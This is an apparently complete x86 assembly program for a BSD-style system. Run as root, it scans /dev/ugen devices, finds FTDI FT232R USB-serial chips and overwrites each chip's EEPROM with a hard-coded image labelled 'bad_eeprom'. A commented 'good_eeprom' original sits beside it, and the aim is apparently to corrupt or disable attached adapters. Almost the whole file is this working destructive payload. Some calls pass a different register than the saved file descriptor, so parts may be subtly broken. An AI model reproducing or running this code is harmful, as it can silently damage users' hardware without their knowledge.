;The MIT License (MIT)

;Copyright (c) 2024 David Reguera Garcia aka Dreg & Ivan Redondo aka S0S4

;Permission is hereby granted, free of charge, to any person obtaining a copy
;of this software and associated documentation files (the "Software"), to deal
;in the Software without restriction, including without limitation the rights
;to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
;copies of the Software, and to permit persons to whom the Software is
;furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included in all
;copies or substantial portions of the Software.

;THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
;SOFTWARE.


; By: @S0S4 & Dreg
; github.com/therealdreg

global _start

%macro memset 3
    mov ecx, %1
    mov edi, %2
    mov al, %3
    cld
; %%repeat:
    rep stosb
;    loop  %%repeat
%endmacro

%macro bzero 2
     memset %1, %2, 0x00
%endmacro

%macro allocstackz 1
     sub esp, %1
     bzero %1, esp
%endmacro


section .text



_start:

    call get_delta
    mid_delta:


    jmp after_delta

    get_delta:
        mov ebp, [esp]
        sub ebp, mid_delta
        ret
    after_delta:

;   CHECK UID

    mov eax, 25
    push 0xBEBECAFE
    int 80h

    cmp eax, 0x0
    jne msg

    add esp, 4

    push 0x00
    push 0x302e306e ; n0.0
    push 0x6567752f ; /uge
    push 0x7665642f ; /dev



main:
    cmp byte [esp+11], 0x3A ; Segundo 0
    je incdesc


; open()

    push 0x2 ; RWX
    push esp
    add DWORD [esp], 4
    mov eax,0x5
    push 0xBEBECAFE
    int 80h

    add esp, 4*3

    cmp eax, 0x0
    jl end

    mov esi, eax

; ioctl()

    allocstackz 0x170

    mov eax, esi

    push esp
    push 0x41705570 ; IOCTL USB_GET_DEVICEINFO PACKET
    push eax ; FD
    mov eax, 0x36
    push 0xBEBECAFE
    int 80h

    mov ecx, [esp+(4*4)]
    add esp, (0x170)+(4*4)

    cmp eax, 0
    jl end

; Check if FTDI232r


    cmp DWORD ecx, 0x4036001
    jne close_fd

; RESET

    allocstackz 0x20

    mov BYTE [esp+0x9], 0x40

    push esp
    push 0xC014556F
    push esi
    mov eax, 0x36
    push 0xBEBECAFE
    int 80h

    cmp eax, 0x0
    jl end

    add esp, 4*4

    ; Poll Modem

    mov [esp], esp
    add DWORD [esp], 0x18
    mov BYTE [esp+0x9], 0xC0
    mov BYTE [esp+0xA], 0x05
    mov BYTE [esp+0xF], 0x02

    push esp
    push 0xC014556F
    push esi
    mov eax, 0x36
    push 0xBEBECAFE
    int 80h

    add esp, 4*4

    cmp eax, 0x0
    jl end

    ; Latency


    mov BYTE [esp+0x9], 0x40
    mov BYTE [esp+0xA], 0x09
    mov BYTE [esp+0xB], 0x77
    mov BYTE [esp+0xF], 0x00

    push esp
    push 0xC014556F
    push ebx
    mov eax, 0x36
    push 0xBEBECAFE

    int 80h

    add esp, 4*4

    cmp eax, 0x0
    jl end

; WRITECELL


    lea edx, [ebp+bad_eeprom]
    mov esi, 0x0

    write_cell_loop:

    mov cx, [edx]

    mov BYTE [esp+0x9], 0x40
    mov BYTE [esp+0xA], 0x91
    mov BYTE [esp+0xB], cl
    mov BYTE [esp+0xC], ch
    mov DWORD [esp+0xD], esi

    push esp
    push 0xC014556F
    push ebx
    mov eax, 0x36
    push 0xBEBECAFE
    int 80h

    inc esi
    add esp, 4*4
    add edx, 0x2


    cmp esi, 0x40
    jne write_cell_loop
    add esp, 0x20

close_fd:
    ;add esp, 4*1

    push ebx
    mov eax, 0x6
    push 0xBEBECAFE
    int 80h

    add esp, 4*2

    add byte [esp+11], 1
    jmp main

incdesc:

    cmp byte [esp+9], 0x39
    je end
    mov byte [esp+11], 0x30
    inc byte [esp+9]
    jmp main

msg:
    push 0x8
    lea eax, [ebp+uid_msg]
    push eax
    push 0x1
    mov eax, 0x4
    push 0xBEBECAFE
    int 80h

    add esp, 4*4

end:

    mov eax, 0x1
    push 0x0
    push 0xBEBECAFE
    int 80h

;good_eeprom db 0x00, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06,0xA0, 0x2D, 0x08, 0x00, 0x00, 0x02, 0x98, 0x0A,0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00,0x49, 0x00, 0x20, 0x03, 0x46, 0x00, 0x54, 0x00,0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00,0x20, 0x00, 0x55, 0x00, 0x41, 0x00, 0x52, 0x00,0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00,0x41, 0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD5, 0x54,0x28, 0x04, 0xD7, 0xFB, 0x00, 0x00, 0x2D, 0xEB,0x36, 0x12, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x31, 0x41, 0x4D, 0x55, 0x53, 0x34, 0x4C, 0x46,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF

bad_eeprom db 0x02, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06,0xA0, 0x2D, 0x08, 0x00, 0x00, 0x02, 0x98, 0x0A,0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00,0x49, 0x00, 0x20, 0x03, 0x46, 0x00, 0x54, 0x00,0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00,0x20, 0x00, 0x55, 0x00, 0x41, 0x00, 0x52, 0x00,0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00,0x41, 0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x54

uid_msg db "Bad UID"
